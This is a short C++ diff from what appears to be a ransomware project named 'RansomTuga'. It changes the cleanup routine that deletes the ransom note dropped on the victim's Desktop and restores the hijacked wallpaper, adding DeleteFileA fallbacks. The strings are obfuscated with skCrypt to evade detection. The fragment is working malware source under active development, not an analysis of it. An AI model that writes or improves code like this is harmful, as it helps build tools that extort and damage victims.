@@ -75,11 +75,13 @@ int main(int argc, char* argv[])
 
 
     if (DROP_README)
-        remove(((string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\Desktop\\README.txt")).c_str());
+        if (remove(((string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\Desktop\\README.txt")).c_str()) != 0)
+            DeleteFileA(((string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\Desktop\\README.txt")).c_str());
 
     if (CHANGE_WALLPAPER) {
         restoreWallpaper();
-        remove((NEWWALLPAPER).c_str());
+        if (remove((NEWWALLPAPER).c_str()) != 0)
+            DeleteFileA((NEWWALLPAPER).c_str());
     }
 
     cout << skCrypt("Thank you for choosing RansomTuga!\n\n");
